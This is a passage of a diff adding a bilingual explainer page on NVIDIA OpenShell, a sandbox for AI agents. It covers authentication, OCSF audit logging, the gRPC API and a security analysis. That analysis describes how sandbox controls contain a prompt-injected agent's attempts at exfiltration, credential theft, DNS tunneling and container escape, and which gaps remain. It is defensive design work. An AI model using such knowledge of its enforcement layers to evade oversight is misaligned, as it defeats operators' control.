+    User(UserPrincipal),        <span class="cm">// OIDC-authenticated operator</span>
+    Sandbox(SandboxPrincipal),  <span class="cm">// supervisor with bound sandbox_id</span>
+    Anonymous,                  <span class="cm">// health checks, reflection only</span>
+}</pre>
+      <p><strong>SandboxPrincipal</strong> <span data-en="carries" data-zh="帶有">carries</span> <code>sandbox_id: String</code> <span data-en="(canonical UUID, must match the request body)" data-zh="（canonical UUID，必須與 request body 一致）">(canonical UUID, must match the request body)</span>, <code>source: SandboxIdentitySource</code> <span data-en="(how it authenticated)" data-zh="（其認證方式）">(how it authenticated)</span>, <code>trust_domain: Option&lt;String&gt;</code>.</p>
+
+      <div class="tblwrap"><table>
+        <thead><tr><th data-en="Method" data-zh="方法">Method</th><th data-en="Identity source" data-zh="身分來源">Identity source</th><th data-en="Use case" data-zh="適用情境">Use case</th></tr></thead>
+        <tbody>
+          <tr><td class="c"><strong>OIDC JWT</strong></td><td data-en="External IdP (Okta, Auth0, …)" data-zh="外部 IdP（Okta、Auth0……）">External IdP (Okta, Auth0, …)</td><td data-en="Operator / user authentication" data-zh="操作者／使用者認證">Operator / user authentication</td></tr>
+          <tr><td class="c"><strong>Gateway-minted JWT</strong></td><td class="c">SandboxJwtIssuer</td><td data-en="Sandbox bootstrap — the supervisor proving its identity" data-zh="Sandbox bootstrap——supervisor 證明自身身分">Sandbox bootstrap — the supervisor proving its identity</td></tr>
+          <tr><td class="c"><strong>K8s ServiceAccount</strong></td><td data-en="Pod SA token → IssueSandboxToken RPC" data-zh="Pod SA token → IssueSandboxToken RPC">Pod SA token → <code>IssueSandboxToken</code> RPC</td><td data-en="K8s-native sandbox bootstrap" data-zh="K8s 原生 sandbox bootstrap">K8s-native sandbox bootstrap</td></tr>
+          <tr><td class="c"><strong>Cloudflare JWT</strong></td><td data-en="Cloudflare Access headers" data-zh="Cloudflare Access headers">Cloudflare Access headers</td><td data-en="Zero-trust network overlay" data-zh="零信任網路 overlay">Zero-trust network overlay</td></tr>
+          <tr><td class="c"><strong>mTLS</strong></td><td data-en="Per-sandbox client certificate" data-zh="每個 sandbox 一張 client 憑證">Per-sandbox client certificate</td><td data-en="Certificate-based mutual auth (supervisor↔sandbox channel per docs)" data-zh="憑證式雙向認證（依文件用於 supervisor↔sandbox 通道）">Certificate-based mutual auth (supervisor↔sandbox channel per docs)</td></tr>
+          <tr><td class="c"><strong>SPIFFE</strong></td><td data-en="Workload API JWT" data-zh="Workload API JWT">Workload API JWT</td><td data-en="Service mesh / workload identity" data-zh="Service mesh / workload identity">Service mesh / workload identity</td></tr>
+        </tbody>
+      </table></div>
+      <p style="font-size:.9rem" data-en="Channel security from the verified docs: Gateway JWT for supervisor→gateway (over TLS when enabled), mTLS + sandbox JWT for supervisor→sandbox, with tokens bound to a single sandbox and a single run. The sandbox side holds nothing worth stealing: no gateway signing key, no gateway JWT, no provider credentials in its own right." data-zh="通道安全（出自查證文件）：supervisor→gateway 使用 Gateway JWT（啟用 TLS 時走 TLS），supervisor→sandbox 使用 mTLS + sandbox JWT，token 綁定單一 sandbox 與單次 run。Sandbox 側持有「沒有值得偷的東西」：無 gateway 簽署金鑰、無 gateway JWT、本身不持有 provider 憑證。">Channel security from the verified docs: Gateway JWT for supervisor→gateway (over TLS when enabled), mTLS + sandbox JWT for supervisor→sandbox, with tokens bound to a single sandbox and a single run. The sandbox side holds <em>nothing worth stealing</em>: no gateway signing key, no gateway JWT, no provider credentials in its own right.</p>
+
+      <h3 class="sub" data-en="Sandbox authentication flow" data-zh="Sandbox 認證流程">Sandbox authentication flow</h3>
+      <ol>
+        <li data-en="The Gateway creates the sandbox and mints a sandbox JWT (the token)." data-zh="Gateway 建立 sandbox 並簽發 sandbox JWT（token）。">The Gateway creates the sandbox and mints a sandbox JWT (the token).</li>
+        <li data-en="The Supervisor starts inside the sandbox holding that token." data-zh="Supervisor 在 sandbox 內持該 token 啟動。">The Supervisor starts inside the sandbox holding that token.</li>
+        <li data-en="It connects back out (ConnectSupervisor) and presents the JWT." data-zh="它向外回連（ConnectSupervisor）並出示 JWT。">It connects back out (<code>ConnectSupervisor</code>) and presents the JWT.</li>
+        <li data-en="The Gateway validates the JWT and binds the sandbox_id to the session — every later frame inherits that binding." data-zh="Gateway 驗證 JWT，並將 sandbox_id 綁定到 session——後續每個 frame 都繼承此綁定。">The Gateway validates the JWT and binds the <code>sandbox_id</code> to the session — every later frame inherits that binding.</li>
+      </ol>
+
+      <h3 class="sub" data-en="Credential refresh strategies" data-zh="憑證刷新策略">Credential refresh strategies</h3>
+      <div class="tblwrap"><table>
+        <thead><tr><th>Strategy</th><th data-en="Mechanism" data-zh="機制">Mechanism</th></tr></thead>
+        <tbody>
+          <tr><td class="c"><code>STATIC</code></td><td data-en="Fixed credential, no rotation" data-zh="固定憑證，不輪換">Fixed credential, no rotation</td></tr>
+          <tr><td class="c"><code>EXTERNAL</code></td><td data-en="Externally managed; the Gateway is notified on change" data-zh="外部管理；變更時通知 Gateway">Externally managed; the Gateway is notified on change</td></tr>
+          <tr><td class="c"><code>OAUTH2_REFRESH_TOKEN</code></td><td data-en="Standard OAuth2 refresh flow" data-zh="標準 OAuth2 refresh 流程">Standard OAuth2 refresh flow</td></tr>
+          <tr><td class="c"><code>OAUTH2_CLIENT_CREDENTIALS</code></td><td data-en="M2M OAuth2 client credentials grant" data-zh="M2M OAuth2 client credentials grant">M2M OAuth2 client credentials grant</td></tr>
+          <tr><td class="c"><code>GOOGLE_SERVICE_ACCOUNT_JWT</code></td><td data-en="Google SA JWT assertion flow" data-zh="Google SA JWT assertion 流程">Google SA JWT assertion flow</td></tr>
+        </tbody>
+      </table></div>
+      <p style="font-size:.9rem" data-en="Each strategy supports audience overrides (ProviderCredentialTokenGrantAudienceOverride) for per-endpoint audience mappings. Operationally: credential rotation and revocation must work without the agent's cooperation — after revocation, verify the supervisor actually refuses the old placeholder." data-zh="每種策略都支援 audience override（ProviderCredentialTokenGrantAudienceOverride），供 per-endpoint audience 對照。操作上的要點：憑證輪換與撤銷必須不依賴 agent 配合——撤銷後要驗證 supervisor 確實拒絕舊 placeholder。">Each strategy supports audience overrides (<code>ProviderCredentialTokenGrantAudienceOverride</code>) for per-endpoint audience mappings. Operationally: credential rotation and revocation must work without the agent's cooperation — after revocation, verify the supervisor actually refuses the old placeholder.</p>
+    </section>
+
+    <!-- ============ 10 · OCSF ============ -->
+    <section class="chapter" id="s10">
+      <div class="ch-head"><span class="ch-num">10</span><h2 data-en="OCSF logging: SIEM-grade from day one" data-zh="OCSF 日誌：第一天就是 SIEM 等級">OCSF logging: SIEM-grade from day one</h2><span class="tag d0003">D0003 · openshell-ocsf</span><span class="tag official">NVIDIA official</span></div>
+      <p class="ch-sub" data-en="Security events are emitted in OCSF v1.7.0 (Open Cybersecurity Schema Framework), so enterprise SIEMs can consume them directly. The official blog confirms the OCSF audit trail for policy decisions; the class-level detail below is D0003's." data-zh="安全事件以 OCSF v1.7.0（Open Cybersecurity Schema Framework）格式發出，企業 SIEM 可直接消費。官方部落格確認政策決策會寫入 OCSF audit trail；以下 class 層級細節出自 D0003。">Security events are emitted in OCSF v1.7.0 (Open Cybersecurity Schema Framework), so enterprise SIEMs can consume them directly. The official blog confirms the OCSF audit trail for policy decisions; the class-level detail below is D0003's.</p>
+
+      <div class="tblwrap"><table>
+        <thead><tr><th>Event class</th><th data-en="When emitted" data-zh="發出時機">When emitted</th><th data-en="Examples" data-zh="範例">Examples</th></tr></thead>
+        <tbody>
+          <tr><td class="c"><code>NetworkActivityEvent</code></td><td data-en="L4 connection decisions" data-zh="L4 連線決策">L4 connection decisions</td><td data-en="TCP connect allowed/denied, proxy operations" data-zh="TCP connect 允許／拒絕、proxy 操作">TCP connect allowed/denied, proxy operations</td></tr>
+          <tr><td class="c"><code>HttpActivityEvent</code></td><td data-en="L7 per-request decisions" data-zh="L7 逐請求決策">L7 per-request decisions</td><td>HTTP GET /api/v1/repos allowed · POST /admin denied</td></tr>
+          <tr><td class="c"><code>SshActivityEvent</code></td><td data-en="SSH authentication, channel ops" data-zh="SSH 認證、channel 操作">SSH authentication, channel ops</td><td data-en="SSH key auth success, tunnel opened" data-zh="SSH key 認證成功、tunnel 開啟">SSH key auth success, tunnel opened</td></tr>
+          <tr><td class="c"><code>ProcessActivityEvent</code></td><td data-en="Process lifecycle" data-zh="程序生命週期">Process lifecycle</td><td data-en="Agent started, agent exited, timeout killed" data-zh="Agent 啟動、agent 結束、timeout 被終止">Agent started, agent exited, timeout killed</td></tr>
+          <tr><td class="c"><code>DetectionFindingEvent</code></td><td data-en="Security alerts" data-zh="安全警報">Security alerts</td><td data-en="Nonce replay detected, unsafe policy loaded" data-zh="偵測到 nonce replay、載入不安全政策">Nonce replay detected, unsafe policy loaded</td></tr>
+          <tr><td class="c"><code>ApplicationLifecycleEvent</code></td><td data-en="System lifecycle" data-zh="系統生命週期">System lifecycle</td><td data-en="Sandbox ready, SSH server started" data-zh="Sandbox 就緒、SSH server 啟動">Sandbox ready, SSH server started</td></tr>
+          <tr><td class="c"><code>DeviceConfigStateChangeEvent</code></td><td data-en="Policy / config changes" data-zh="政策／組態變更">Policy / config changes</td><td data-en="Landlock applied, TLS cert rotated, policy reloaded" data-zh="Landlock 已套用、TLS 憑證輪換、政策 reload">Landlock applied, TLS cert rotated, policy reloaded</td></tr>
+        </tbody>
+      </table></div>
+
+      <div class="grid2">
+        <div>
+          <h3 class="sub" data-en="Severity model" data-zh="Severity 模型">Severity model</h3>
+          <div class="tblwrap"><table>
+            <thead><tr><th>Severity</th><th data-en="When used" data-zh="使用時機">When used</th></tr></thead>
+            <tbody>
+              <tr><td class="c">Informational</td><td data-en="Allowed requests, normal operations" data-zh="允許的請求、正常操作">Allowed requests, normal operations</td></tr>
+              <tr><td class="c">Low</td><td data-en="DNS resolution failures, minor anomalies" data-zh="DNS 解析失敗、輕微異常">DNS resolution failures, minor anomalies</td></tr>
+              <tr><td class="c">Medium</td><td data-en="Denied requests (enforcement working as intended)" data-zh="被拒請求（強制執行如預期運作）">Denied requests (enforcement working as intended)</td></tr>
+              <tr><td class="c">High</td><td data-en="Security findings (bypass attempts, policy violations)" data-zh="安全 finding（繞過嘗試、政策違規）">Security findings (bypass attempts, policy violations)</td></tr>
+              <tr><td class="c">Critical</td><td data-en="Process timeout kills, sandbox integrity compromise" data-zh="程序 timeout 終止、sandbox 完整性受損">Process timeout kills, sandbox integrity compromise</td></tr>
+            </tbody>
+          </table></div>
+        </div>
+        <div>
+          <h3 class="sub" data-en="Output layers" data-zh="輸出層">Output layers</h3>
+          <div class="tblwrap"><table>
+            <thead><tr><th>Layer</th><th data-en="Format → destination" data-zh="格式 → 目的地">Format → destination</th></tr></thead>
+            <tbody>
+              <tr><td class="c"><code>OcsfShorthandLayer</code></td><td data-en="Human-readable one-liner → stderr / rolling file (debugging)" data-zh="人類可讀單行 → stderr / rolling file（除錯）">Human-readable one-liner → stderr / rolling file (debugging)</td></tr>
+              <tr><td class="c"><code>OcsfJsonlLayer</code></td><td data-en="OCSF JSONL → /var/log/openshell-ocsf*.log (SIEM ingestion)" data-zh="OCSF JSONL → /var/log/openshell-ocsf*.log（SIEM 匯入）">OCSF JSONL → <code>/var/log/openshell-ocsf*.log</code> (SIEM ingestion)</td></tr>
+              <tr><td class="c">Log-push task</td><td data-en="gRPC stream → Gateway PushSandboxLogs (centralised collection)" data-zh="gRPC stream → Gateway PushSandboxLogs（集中收集）">gRPC stream → Gateway <code>PushSandboxLogs</code> (centralised collection)</td></tr>
+            </tbody>
+          </table></div>
+        </div>
+      </div>
+
+      <div class="card">
+        <h4 class="sub" style="margin-top:0" data-en="The dual-emit pattern" data-zh="Dual-emit 模式">The dual-emit pattern</h4>
+        <p data-en="Security-relevant events are emitted twice: once as the domain event (e.g. an HttpActivityEvent with a deny disposition) and once as a DetectionFindingEvent carrying an ATT&amp;CK framework mapping. Security findings therefore surface in both operational dashboards and security alert pipelines — neither audience has to mine the other's stream." data-zh="安全相關事件會發出兩次：一次是 domain event（例如帶 deny disposition 的 HttpActivityEvent），一次是帶 ATT&CK 框架對照的 DetectionFindingEvent。因此安全 finding 同時出現在營運儀表板與安全警報管線——兩邊都不必去挖對方的 stream。">Security-relevant events are emitted <strong>twice</strong>: once as the domain event (e.g. an <code>HttpActivityEvent</code> with a deny disposition) and once as a <code>DetectionFindingEvent</code> carrying an ATT&amp;CK framework mapping. Security findings therefore surface in both operational dashboards and security alert pipelines — neither audience has to mine the other's stream.</p>
+        <p style="margin:0" data-en="What NOT to log as OCSF (project guidance in AGENTS.md, per D0003): OCSF is for observable sandbox behaviour — network decisions, auth, process lifecycle, security findings, config changes. Internal plumbing (gRPC retries, SSH state machines, zombie reaping, denial-flush telemetry) uses plain Rust tracing. The separation is deliberate: OCSF stays SIEM-grade instead of drowning in plumbing noise." data-zh="什麼不該記成 OCSF（D0003 引述的專案 AGENTS.md 指引）：OCSF 用於可觀察的 sandbox 行為——網路決策、認證、程序生命週期、安全 finding、組態變更。內部 plumbing（gRPC 重試、SSH 狀態機、zombie 回收、denial-flush 遙測）使用一般 Rust tracing。這個分離是刻意的：OCSF 保持 SIEM 等級，不被 plumbing 噪聲淹沒。"><strong>What NOT to log as OCSF</strong> (project guidance in <code>AGENTS.md</code>, per D0003): OCSF is for observable sandbox behaviour — network decisions, auth, process lifecycle, security findings, config changes. Internal plumbing (gRPC retries, SSH state machines, zombie reaping, denial-flush telemetry) uses plain Rust tracing. The separation is deliberate: OCSF stays SIEM-grade instead of drowning in plumbing noise.</p>
+      </div>
+      <div class="note warn"><div class="note-t" data-en="Acceptance-test warning from an independent test" data-zh="獨立測試的驗收警示">Acceptance-test warning from an independent test <span class="tag vendor" data-en="Independent test, not peer-reviewed" data-zh="獨立測試，非同行評審">Independent test, not peer-reviewed</span></div>
+      <p style="margin:0" data-en="A single-tester evaluation of v0.1.2 (Sorami, non-peer-reviewed) reported logging gaps on the VM driver — blocked UDP DNS produced no event, the OCSF JSON export did not write to file, and Landlock events appeared only on the VM console. It does not generalise to every deployment, but it belongs on an acceptance checklist: verify that every blocked request actually produces an event, per driver." data-zh="一份針對 v0.1.2 的單人測試（Sorami，非同行評審）報告了 VM driver 的日誌缺口：被阻擋的 UDP DNS 無事件、OCSF JSON export 未寫檔、Landlock 事件僅出現在 VM console。它不能推廣為所有部署的通則，但應列入驗收清單：逐 driver 驗證每個被阻擋的請求確實產生事件。">A single-tester evaluation of v0.1.2 (Sorami, non-peer-reviewed) reported logging gaps on the VM driver — blocked UDP DNS produced no event, the OCSF JSON export did not write to file, and Landlock events appeared only on the VM console. It does not generalise to every deployment, but it belongs on an acceptance checklist: verify that every blocked request actually produces an event, per driver.</p></div>
+    </section>
+
+    <!-- ============ 11 · GRPC API ============ -->
+    <section class="chapter" id="s11">
+      <div class="ch-head"><span class="ch-num">11</span><h2 data-en="gRPC API surface: ~50 RPCs, one service" data-zh="gRPC API 介面：約 50 個 RPC、單一 service">gRPC API surface: ~50 RPCs, one service</h2><span class="tag d0003">D0003</span></div>
+      <p class="ch-sub" data-en="The Gateway exposes a single OpenShell gRPC service. The draft-policy group (9 RPCs) is unusually large for a sandbox platform — it is the API footprint of the policy-learning loop in Section 6." data-zh="Gateway 暴露單一 OpenShell gRPC service。Draft policy 群組（9 個 RPC）對 sandbox 平台而言異常龐大——那正是第 6 節政策學習迴圈的 API 足跡。">The Gateway exposes a single <code>OpenShell</code> gRPC service. The draft-policy group (9 RPCs) is unusually large for a sandbox platform — it is the API footprint of the policy-learning loop in Section 6.</p>
+      <div class="tblwrap"><table class="filterable">
+        <thead><tr><th data-en="Group" data-zh="群組">Group</th><th>Key RPCs</th><th data-en="Count" data-zh="數量">Count</th></tr></thead>
+        <tbody>
+          <tr><td data-en="Sandbox lifecycle" data-zh="Sandbox 生命週期">Sandbox lifecycle</td><td class="c">CreateSandbox · GetSandbox · ListSandboxes · DeleteSandbox · WatchSandbox</td><td class="c">5</td></tr>
+          <tr><td data-en="Execution" data-zh="執行">Execution</td><td class="c">ExecSandbox · ExecSandboxInteractive · ForwardTcp</td><td class="c">3</td></tr>
+          <tr><td>SSH</td><td class="c">CreateSshSession · RevokeSshSession</td><td class="c">2</td></tr>
+          <tr><td data-en="Service exposure" data-zh="服務暴露">Service exposure</td><td class="c">ExposeService · GetService · ListServices · DeleteService</td><td class="c">4</td></tr>
+          <tr><td>Providers</td><td class="c">CreateProvider · GetProvider · ListProviders · UpdateProvider · DeleteProvider <span data-en="+ 7 profile/refresh RPCs" data-zh="＋ 7 個 profile/refresh RPC">+ 7 profile/refresh RPCs</span></td><td class="c">12</td></tr>
+          <tr><td data-en="Policy" data-zh="政策">Policy</td><td class="c">GetSandboxPolicyStatus · ListSandboxPolicies · ReportPolicyStatus</td><td class="c">3</td></tr>
+          <tr><td data-en="Draft policy" data-zh="Draft 政策">Draft policy</td><td class="c">SubmitPolicyAnalysis · GetDraftPolicy · ApproveDraftChunk · RejectDraftChunk · ApproveAllDraftChunks · EditDraftChunk · UndoDraftChunk · ClearDraftChunks · GetDraftHistory</td><td class="c">9</td></tr>
+          <tr><td data-en="Config" data-zh="組態">Config</td><td class="c">GetSandboxConfig · GetGatewayConfig · UpdateConfig</td><td class="c">3</td></tr>
+          <tr><td data-en="Auth" data-zh="認證">Auth</td><td class="c">IssueSandboxToken · RefreshSandboxToken</td><td class="c">2</td></tr>
+          <tr><td data-en="Supervisor session" data-zh="Supervisor session">Supervisor session</td><td class="c">ConnectSupervisor (bidirectional stream) · RelayStream</td><td class="c">2</td></tr>
+          <tr><td data-en="Observability" data-zh="可觀測性">Observability</td><td class="c">GetSandboxLogs · PushSandboxLogs · Health</td><td class="c">3</td></tr>
+        </tbody>
+      </table></div>
+      <p class="noresult" data-en="No API group matches your search." data-zh="沒有 API 群組符合搜尋。">No API group matches your search.</p>
+
+      <h3 class="sub" data-en="The ConnectSupervisor session protocol" data-zh="ConnectSupervisor session 協定">The ConnectSupervisor session protocol</h3>
+      <p data-en="The most architecturally significant RPC: it establishes the persistent bidirectional stream between supervisor and gateway (the OpenShell Sandbox Protocol, mutually authenticated over HTTP/2 per the verified docs)." data-zh="架構上最重要的 RPC：它建立 supervisor 與 gateway 之間的持久雙向 stream（OpenShell Sandbox Protocol，依查證文件經 HTTP/2 相互驗證）。">The most architecturally significant RPC: it establishes the persistent bidirectional stream between supervisor and gateway (the OpenShell Sandbox Protocol, mutually authenticated over HTTP/2 per the verified docs).</p>
+      <pre>Supervisor → Gateway:  SupervisorHello { sandbox_id, capabilities }
+Gateway → Supervisor:  SessionAccepted { session_id }
+                       <span class="cm">--- or ---</span>
+                       SessionRejected { reason }
+
+Ongoing:               SupervisorHeartbeat ↔ GatewayHeartbeat
+                       RelayOpen → RelayOpenResult <span class="cm">(SSH, exec, TCP channels)</span>
+                       RelayClose <span class="cm">(either side)</span></pre>
+      <p data-en="All relay channels — SSH sessions, exec commands, TCP forwarding — are multiplexed over this single stream. The first frame of each relay must be a RelayInit carrying a channel_id; subsequent frames are raw bytes. Walk the full lifecycle in Section 12." data-zh="所有 relay channel——SSH session、exec 指令、TCP forwarding——都多工在這一條 stream 上。每個 relay 的第一個 frame 必須是帶 channel_id 的 RelayInit；後續 frame 為原始 bytes。完整生命週期走讀見第 12 節。">All relay channels — SSH sessions, exec commands, TCP forwarding — are <strong>multiplexed</strong> over this single stream. The first frame of each relay must be a <code>RelayInit</code> carrying a <code>channel_id</code>; subsequent frames are raw bytes. Walk the full lifecycle in Section 12.</p>
+    </section>
+
+    <!-- ============ 12 · SEQUENCES ============ -->
+    <section class="chapter" id="s12">
+      <div class="ch-head"><span class="ch-num">12</span><h2 data-en="Sequence walkthroughs" data-zh="時序走讀">Sequence walkthroughs</h2><span class="tag d0003">D0003</span></div>
+      <p class="ch-sub" data-en="Five flows, step by step. Pick a scenario, then step through it — the actors involved in each step light up. Auto-play advances every 2.4 seconds." data-zh="五個流程，逐步走讀。選擇情境後逐步前進——每一步涉及的 actor 會亮起。自動播放每 2.4 秒前進一步。">Five flows, step by step. Pick a scenario, then step through it — the actors involved in each step light up. Auto-play advances every 2.4 seconds.</p>
+
+      <div class="tabs" role="tablist" aria-label="Sequence scenarios" id="seqTabs">
+        <button role="tab" aria-selected="true" data-seq="create" data-en="Sandbox creation + agent startup" data-zh="Sandbox 建立＋agent 啟動">Sandbox creation + agent startup</button>
+        <button role="tab" aria-selected="false" data-seq="allow" data-en="L7 request — allowed" data-zh="L7 請求——放行">L7 request — allowed</button>
+        <button role="tab" aria-selected="false" data-seq="deny" data-en="L7 request — denied + draft" data-zh="L7 請求——拒絕＋draft">L7 request — denied + draft</button>
+        <button role="tab" aria-selected="false" data-seq="prover" data-en="Z3 prover gate" data-zh="Z3 prover 閘門">Z3 prover gate</button>
+        <button role="tab" aria-selected="false" data-seq="session" data-en="Supervisor session lifecycle" data-zh="Supervisor session 生命週期">Supervisor session lifecycle</button>
+      </div>
+
+      <div class="seq-ctrl">
+        <button id="seqPrev" data-en="← Prev" data-zh="← 上一步">← Prev</button>
+        <button id="seqPlay" class="primary" data-en="▶ Auto-play" data-zh="▶ 自動播放">▶ Auto-play</button>
+        <button id="seqNext" data-en="Next →" data-zh="下一步 →">Next →</button>
+        <span class="seq-progress" id="seqProgress"></span>
+      </div>
+      <div class="seq-stage">
+        <div class="seq-actors" id="seqActors"></div>
+        <div class="seq-step">
+          <div class="ss-fromto" id="seqFromTo"></div>
+          <div class="ss-text" id="seqText"></div>
+        </div>
+        <div class="seq-dots" id="seqDots"></div>
+      </div>
+    </section>
+
+    <!-- ============ 13 · SECURITY ANALYSIS ============ -->
+    <section class="chapter" id="s13">
+      <div class="ch-head"><span class="ch-num">13</span><h2 data-en="Security analysis" data-zh="安全分析">Security analysis</h2><span class="tag d0003">D0003</span><span class="tag official">NVIDIA official</span></div>
+      <p class="ch-sub" data-en="The honest version of the claim: OpenShell blunts the payoff of prompt injection rather than preventing injection itself. A manipulated agent still tries — it just cannot reach unauthorised files, hosts, methods or credentials, because enforcement lives outside the workload. What it does not do matters just as much." data-zh="誠實版的主張：OpenShell 削弱的是 prompt injection 的獲利，而非阻止 injection 本身。被操縱的 agent 仍會嘗試——只是碰不到未授權的檔案、主機、方法與憑證，因為強制執行位於 workload 之外。它不做的事同樣重要。">The honest version of the claim: OpenShell blunts the <em>payoff</em> of prompt injection rather than preventing injection itself. A manipulated agent still tries — it just cannot reach unauthorised files, hosts, methods or credentials, because enforcement lives outside the workload. What it does not do matters just as much.</p>
+
+      <h3 class="sub" data-en="What OpenShell prevents that other AIDR layers cannot" data-zh="OpenShell 能防、其他 AIDR 層不能防的">What OpenShell prevents that other AIDR layers cannot</h3>
+      <div class="tblwrap"><table>
+        <thead><tr><th data-en="Threat" data-zh="威脅">Threat</th><th data-en="How OpenShell prevents it" data-zh="OpenShell 如何防堵">How OpenShell prevents it</th><th data-en="Why other layers can't" data-zh="其他層為何不能">Why other layers can't</th></tr></thead>
+        <tbody>
+          <tr><td data-en="Filesystem exfiltration" data-zh="Filesystem 外洩">Filesystem exfiltration</td><td data-en="Landlock LSM blocks reads outside the allowlist" data-zh="Landlock LSM 阻擋 allowlist 外的讀取">Landlock LSM blocks reads outside the allowlist</td><td data-en="Omnigent / AGG have no filesystem visibility" data-zh="Omnigent / AGG 看不到 filesystem">Omnigent / AGG have no filesystem visibility</td></tr>
+          <tr><td data-en="Environment variable theft" data-zh="環境變數竊取">Environment variable theft</td><td data-en="seccomp BPF + Landlock restrict /proc/*/environ access" data-zh="seccomp BPF + Landlock 限制 /proc/*/environ 存取">seccomp BPF + Landlock restrict <code>/proc/*/environ</code> access</td><td data-en="Model-level safety is bypassable" data-zh="模型層安全可被繞過">Model-level safety is bypassable</td></tr>
+          <tr><td data-en="DNS tunneling" data-zh="DNS tunneling">DNS tunneling</td><td data-en="Network namespace + nftables redirect all DNS through the proxy" data-zh="Network namespace + nftables 將所有 DNS 導向 proxy">Network namespace + nftables redirect all DNS through the proxy</td><td data-en="AGG only sees MCP tool calls" data-zh="AGG 只看得到 MCP tool call">AGG only sees MCP tool calls</td></tr>
+          <tr><td data-en="Direct API calls (bypassing MCP)" data-zh="直接 API 呼叫（繞過 MCP）">Direct API calls (bypassing MCP)</td><td data-en="The OPA proxy is the only network path; nftables enforces this" data-zh="OPA proxy 是唯一網路路徑；nftables 強制之">The OPA proxy is the <em>only</em> network path; nftables enforces this</td><td data-en="AGG requires traffic to flow through its gateway" data-zh="AGG 需要流量經過其 gateway">AGG requires traffic to flow through its gateway</td></tr>
+          <tr><td data-en="Privilege escalation" data-zh="權限提升">Privilege escalation</td><td data-en="seccomp blocks ptrace, mount, setuid; capabilities dropped" data-zh="seccomp 阻擋 ptrace、mount、setuid；capability 已丟棄">seccomp blocks <code>ptrace</code>, <code>mount</code>, <code>setuid</code>; capabilities dropped</td><td data-en="No other AIDR component operates at kernel level" data-zh="沒有其他 AIDR 元件在核心層運作">No other AIDR component operates at kernel level</td></tr>
+          <tr><td data-en="Container escape" data-zh="容器逃逸">Container escape</td><td data-en="Landlock + seccomp + namespace isolation" data-zh="Landlock + seccomp + namespace 隔離">Landlock + seccomp + namespace isolation</td><td data-en="Not addressable at the application layer" data-zh="應用層無法處理">Not addressable at the application layer</td></tr>
+          <tr><td data-en="Shadow AI" data-zh="Shadow AI">Shadow AI</td><td data-en="The inference router intercepts all LLM calls at inference.local" data-zh="Inference router 在 inference.local 攔截所有 LLM 呼叫">The inference router intercepts all LLM calls at <code>inference.local</code></td><td data-en="Omnigent only sees Claude Code hooks" data-zh="Omnigent 只看得到 Claude Code hooks">Omnigent only sees Claude Code hooks</td></tr>
+          <tr><td data-en="Credential leakage" data-zh="憑證洩漏">Credential leakage</td><td data-en="Credentials injected as env vars; agent-originated credentials stripped from requests" data-zh="憑證以 env var 注入；agent 自帶憑證在請求時被剝除">Credentials injected as env vars; agent-originated credentials stripped from requests</td><td data-en="AGG's agw_ tokens are agent-visible" data-zh="AGG 的 agw_ token 對 agent 可見">AGG's <code>agw_</code> tokens are agent-visible</td></tr>
+          <tr><td data-en="SSRF to metadata services" data-zh="對 metadata 服務的 SSRF">SSRF to metadata services</td><td data-en="The Z3 prover checks LINK_LOCAL_REACH before deployment" data-zh="Z3 prover 在部署前檢查 LINK_LOCAL_REACH">The Z3 prover checks <code>LINK_LOCAL_REACH</code> before deployment</td><td data-en="Other layers offer reactive detection only (AGG anomaly)" data-zh="其他層只有事後偵測（AGG anomaly）">Other layers offer reactive detection only (AGG anomaly)</td></tr>
+        </tbody>
+      </table></div>
+
+      <h3 class="sub" data-en="What OpenShell does NOT address" data-zh="OpenShell 不處理的">What OpenShell does NOT address</h3>
+      <div class="tblwrap"><table>
+        <thead><tr><th data-en="Gap" data-zh="缺口">Gap</th><th data-en="Why" data-zh="原因">Why</th><th data-en="Covered by" data-zh="由何者補上">Covered by</th></tr></thead>
+        <tbody>
+          <tr><td data-en="Agent reasoning governance" data-zh="Agent 推理治理">Agent reasoning governance</td><td data-en="OpenShell sees bytes, not intent" data-zh="OpenShell 看到 bytes，看不到意圖">OpenShell sees bytes, not intent</td><td data-en="Omnigent (6-phase policy, hook enforcement)" data-zh="Omnigent（6-phase policy、hook 強制）">Omnigent (6-phase policy, hook enforcement)</td></tr>
+          <tr><td data-en="MCP tool approval workflow" data-zh="MCP 工具批准流程">MCP tool approval workflow</td><td data-en="Out of scope (network-layer enforcement)" data-zh="不在範圍內（網路層強制）">Out of scope (network-layer enforcement)</td><td data-en="AGG (3-tier permission matrix)" data-zh="AGG（3-tier permission matrix）">AGG (3-tier permission matrix)</td></tr>
+          <tr><td data-en="Cross-session behavioural baselines" data-zh="跨 session 行為基線">Cross-session behavioural baselines</td><td data-en="No historical analytics" data-zh="無歷史分析">No historical analytics</td><td data-en="AGG (anomaly detection)" data-zh="AGG（anomaly detection）">AGG (anomaly detection)</td></tr>
+          <tr><td data-en="Supply-chain scanning" data-zh="供應鏈掃描">Supply-chain scanning</td><td data-en="Not a static analysis tool" data-zh="不是靜態分析工具">Not a static analysis tool</td><td data-en="SkillSpector (64-pattern scanner)" data-zh="SkillSpector（64-pattern scanner）">SkillSpector (64-pattern scanner)</td></tr>
+          <tr><td data-en="LLM content policy" data-zh="LLM 內容政策">LLM content policy</td><td data-en="Sees encrypted traffic or raw bytes, not meaning" data-zh="看到加密流量或原始 bytes，看不到語意">Sees encrypted traffic or raw bytes, not meaning</td><td data-en="LLM Gateway (prompt injection, content policy)" data-zh="LLM Gateway（prompt injection、內容政策）">LLM Gateway (prompt injection, content policy)</td></tr>
+          <tr><td data-en="Enterprise IdP integration" data-zh="企業 IdP 整合">Enterprise IdP integration</td><td data-en="Supports OIDC but doesn't define org policy" data-zh="支援 OIDC，但不定義組織政策">Supports OIDC but doesn't define org policy</td><td data-en="Enterprise Identity (ACL/GPO source)" data-zh="Enterprise Identity（ACL/GPO 來源）">Enterprise Identity (ACL/GPO source)</td></tr>
+        </tbody>
+      </table></div>
+
+      <details open>
+        <summary data-en="The wider gap list from verified research (beyond the AIDR framing)" data-zh="查證研究的完整缺口清單（AIDR 框架之外）">The wider gap list from verified research (beyond the AIDR framing)</summary>
+        <div class="det-body">
+          <ul style="margin-bottom:0">
